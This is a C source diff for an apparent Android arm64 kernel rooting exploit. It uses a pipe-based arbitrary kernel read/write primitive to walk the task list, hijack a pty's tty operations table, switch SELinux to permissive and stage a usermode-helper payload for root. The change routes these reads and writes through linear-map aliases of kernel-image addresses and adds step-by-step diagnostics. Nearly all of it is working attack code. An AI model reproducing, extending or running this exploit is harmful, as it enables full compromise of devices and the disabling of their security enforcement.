@@ -122,6 +122,26 @@ static int is_kernel_image_ptr(uint64_t value, uint64_t kernel_base) {
   return value >= kernel_base && value < kernel_base + KERNEL_IMAGE_SPAN;
 }
 
+static int kernel_image_linear_alias(uint64_t target_addr,
+                                     uint64_t memstart_addr,
+                                     uint64_t kimage_voffset,
+                                     uint64_t *linear_alias) {
+  if (!linear_alias || (memstart_addr & 0xfffULL) != 0 ||
+      (kimage_voffset & 0xfffULL) != 0 || target_addr < kimage_voffset) {
+    return 0;
+  }
+  uint64_t physical = target_addr - kimage_voffset;
+  if (physical < memstart_addr) {
+    return 0;
+  }
+  uint64_t linear_offset = physical - memstart_addr;
+  if (linear_offset >= ZZHL_LINEAR_MAP_END - ZZHL_LINEAR_MAP_BASE) {
+    return 0;
+  }
+  *linear_alias = ZZHL_LINEAR_MAP_BASE + linear_offset;
+  return 1;
+}
+
 static uint64_t load_u64(const void *buffer, size_t offset) {
   uint64_t value = 0;
   memcpy(&value, (const uint8_t *)buffer + offset, sizeof(value));
@@ -177,9 +197,17 @@ static int root_socket_ready(void) {
   return ready;
 }
 
-static uint64_t find_current_task(int fd, uint64_t kernel_base) {
+static uint64_t find_current_task(int fd, uint64_t kernel_base,
+                                  uint64_t memstart_addr,
+                                  uint64_t kimage_voffset) {
   uint64_t list_head = kernel_base + INIT_TASK_OFF + TASK_TASKS_OFF;
-  uint64_t node = oss_kernel_read64(fd, list_head + sizeof(uint64_t));
+  uint64_t list_previous_alias = 0;
+  uint64_t node = 0;
+  if (!kernel_image_linear_alias(list_head + sizeof(uint64_t), memstart_addr,
+                                 kimage_voffset, &list_previous_alias) ||
+      !pipe_read64(fd, list_previous_alias, &node)) {
+    return 0;
+  }
   pid_t wanted = getpid();
   for (int walked = 0; walked < 16384; walked++) {
     if (!is_direct_ptr(node) || node == list_head) break;
@@ -196,10 +224,13 @@ static uint64_t find_current_task(int fd, uint64_t kernel_base) {
   return 0;
 }
 
-static int resolve_tty_object(int fd, uint64_t kernel_base, int tty_fd,
+static int resolve_tty_object(int fd, uint64_t kernel_base,
+                              uint64_t memstart_addr,
+                              uint64_t kimage_voffset, int tty_fd,
                               struct tty_kernel_object *object) {
   memset(object, 0, sizeof(*object));
-  uint64_t task = find_current_task(fd, kernel_base);
+  uint64_t task = find_current_task(fd, kernel_base, memstart_addr,
+                                    kimage_voffset);
   uint64_t files = 0, fdt = 0, fd_array = 0;
   uint32_t max_fds = 0;
   if (!task || !pipe_read64(fd, task + TASK_FILES_OFF, &files) ||
@@ -221,6 +252,7 @@ static int resolve_tty_object(int fd, uint64_t kernel_base, int tty_fd,
   }
 
   uint64_t private_file = 0;
+  uint64_t original_ops_alias = 0;
   uint32_t magic = 0, index = 0;
   uint64_t port = 0;
   if (!pipe_read64(fd, object->private_data + TTY_FILE_FILE_OFF,
@@ -231,13 +263,15 @@ static int resolve_tty_object(int fd, uint64_t kernel_base, int tty_fd,
       !pipe_read32(fd, object->tty + TTY_INDEX_OFF, &index) || index > 4095 ||
       !pipe_read64(fd, object->tty + TTY_OPS_OFF, &object->original_ops) ||
       !is_kernel_image_ptr(object->original_ops, kernel_base) ||
+      !kernel_image_linear_alias(object->original_ops, memstart_addr,
+                                 kimage_voffset, &original_ops_alias) ||
       !pipe_read64(fd, object->tty + TTY_PORT_OFF, &port) ||
       !is_direct_ptr(port) ||
       !oss_pipe_rw_read(fd, object->tty + TTY_SAK_WORK_OFF,
                         object->original_tail,
                         sizeof(object->original_tail)) ||
-      !oss_kernel_read(fd, object->original_ops, object->original_ops_table,
-                       sizeof(object->original_ops_table))) {
+      !oss_pipe_rw_read(fd, original_ops_alias, object->original_ops_table,
+                        sizeof(object->original_ops_table))) {
     return 0;
   }
 
@@ -293,6 +327,8 @@ static int restore_tty_object(int fd, const struct tty_kernel_object *object,
 
 int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
                                 uint64_t page_base,
+                                uint64_t memstart_addr,
+                                uint64_t kimage_voffset,
                                 const char *root_umh_path,
                                 int32_t *kernel_state,
                                 int32_t irreversible_state) {
@@ -314,7 +350,8 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
     close_private_pty(&pty);
     return 0;
   }
-  if (!resolve_tty_object(fd, kernel_base, pty.slave, &tty_object)) {
+  if (!resolve_tty_object(fd, kernel_base, memstart_addr, kimage_voffset,
+                          pty.slave, &tty_object)) {
     fprintf(stderr, "[root_umh] private PTY kernel object resolution failed\n");
     close_private_pty(&pty);
     return 0;
@@ -366,13 +403,46 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
 
   uint64_t fake_ops_addr = page_base + ROOT_TTY_OPS_OFF;
   uint64_t selinux_addr = kernel_base + SELINUX_ENFORCING_OFF;
+  uint64_t selinux_alias = 0;
+  if (!kernel_image_linear_alias(selinux_addr, memstart_addr, kimage_voffset,
+                                 &selinux_alias)) {
+    fprintf(stderr,
+            "[root_umh] staging step=selinux-alias failed addr=%016llx\n",
+            (unsigned long long)selinux_addr);
+    close_private_pty(&pty);
+    return 0;
+  }
   unlink(ROOT_SOCKET_PATH);
-  if (!oss_kernel_read(fd, selinux_addr, &original_selinux,
-                       sizeof(original_selinux)) ||
-      original_selinux > 1 ||
-      !oss_pipe_rw_write(fd, umh_data_addr, &umh_data, sizeof(umh_data)) ||
-      !oss_pipe_rw_write(fd, fake_ops_addr, fake_ops, sizeof(fake_ops))) {
-    fprintf(stderr, "[root_umh] private PTY staging failed\n");
+  if (!oss_pipe_rw_read(fd, selinux_alias, &original_selinux,
+                        sizeof(original_selinux))) {
+    fprintf(stderr,
+            "[root_umh] staging step=selinux-read failed addr=%016llx "
+            "alias=%016llx errno=%d\n",
+            (unsigned long long)selinux_addr,
+            (unsigned long long)selinux_alias, errno);
+    close_private_pty(&pty);
+    return 0;
+  }
+  if (original_selinux > 1) {
+    fprintf(stderr,
+            "[root_umh] staging step=selinux-value failed value=%u\n",
+            original_selinux);
+    close_private_pty(&pty);
+    return 0;
+  }
+  if (!oss_pipe_rw_write(fd, umh_data_addr, &umh_data, sizeof(umh_data))) {
+    fprintf(stderr,
+            "[root_umh] staging step=umh-data-write failed addr=%016llx "
+            "errno=%d\n",
+            (unsigned long long)umh_data_addr, errno);
+    close_private_pty(&pty);
+    return 0;
+  }
+  if (!oss_pipe_rw_write(fd, fake_ops_addr, fake_ops, sizeof(fake_ops))) {
+    fprintf(stderr,
+            "[root_umh] staging step=tty-ops-write failed addr=%016llx "
+            "errno=%d\n",
+            (unsigned long long)fake_ops_addr, errno);
     close_private_pty(&pty);
     return 0;
   }
@@ -394,8 +464,16 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
 
   uint8_t permissive = 0;
   selinux_changed = original_selinux != permissive;
-  if (!oss_kernel_write(fd, selinux_addr, &permissive, sizeof(permissive))) {
-    fprintf(stderr, "[root_umh] selinux write failed\n");
+  uint8_t selinux_readback = 0xff;
+  if (!oss_pipe_rw_write(fd, selinux_alias, &permissive,
+                         sizeof(permissive)) ||
+      !oss_pipe_rw_read(fd, selinux_alias, &selinux_readback,
+                        sizeof(selinux_readback)) ||
+      selinux_readback != permissive) {
+    fprintf(stderr,
+            "[root_umh] selinux pipe write failed alias=%016llx got=%u "
+            "errno=%d\n",
+            (unsigned long long)selinux_alias, selinux_readback, errno);
     goto out;
   }
   oss_diag_checkpoint("umh-pty-prequeue");
@@ -465,8 +543,8 @@ out:
   }
   if (!tail_published) safe_to_close = 1;
   if (!result && selinux_changed) {
-    int restored = oss_kernel_write(fd, selinux_addr, &original_selinux,
-                                    sizeof(original_selinux));
+    int restored = oss_pipe_rw_write(fd, selinux_alias, &original_selinux,
+                                     sizeof(original_selinux));
     fprintf(stderr, "[root_umh] selinux restore=%d value=%u\n", restored,
             original_selinux);
   }
@@ -483,9 +561,11 @@ out:
 }
 
 int root_umh_install_fd(int fd, uint64_t kernel_base, uint64_t page_base,
+                        uint64_t memstart_addr, uint64_t kimage_voffset,
                         const char *root_umh_path) {
-  return root_umh_install_fd_tracked(fd, kernel_base, page_base, root_umh_path,
-                                     NULL, 0);
+  return root_umh_install_fd_tracked(
+      fd, kernel_base, page_base, memstart_addr, kimage_voffset,
+      root_umh_path, NULL, 0);
 }
 
 int root_umh_install(uint64_t kernel_base, uint64_t page_base,
@@ -498,9 +578,20 @@ int root_umh_install(uint64_t kernel_base, uint64_t page_base,
   uint64_t ashmem_misc_fops_addr =
       kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
   int verified = oss_verify_kernel_access(fd, ashmem_misc_fops_addr, page_base);
-  int pipe_ready = verified && oss_pipe_rw_install(fd, kernel_base, page_base);
-  int rooted = pipe_ready &&
-               root_umh_install_fd(fd, kernel_base, page_base, root_umh_path);
+  uint64_t memstart_addr = 0;
+  uint64_t kimage_voffset = 0;
+  int alias_inputs =
+      verified &&
+      oss_kernel_read(fd, kernel_base + ZZHL_MEMSTART_ADDR_OFF,
+                      &memstart_addr, sizeof(memstart_addr)) &&
+      oss_kernel_read(fd, kernel_base + ZZHL_KIMAGE_VOFFSET_OFF,
+                      &kimage_voffset, sizeof(kimage_voffset));
+  int pipe_ready = alias_inputs &&
+                   oss_pipe_rw_install(fd, kernel_base, page_base);
+  int rooted =
+      pipe_ready && root_umh_install_fd(fd, kernel_base, page_base,
+                                        memstart_addr, kimage_voffset,
+                                        root_umh_path);
   close(fd);
   return rooted;
 }
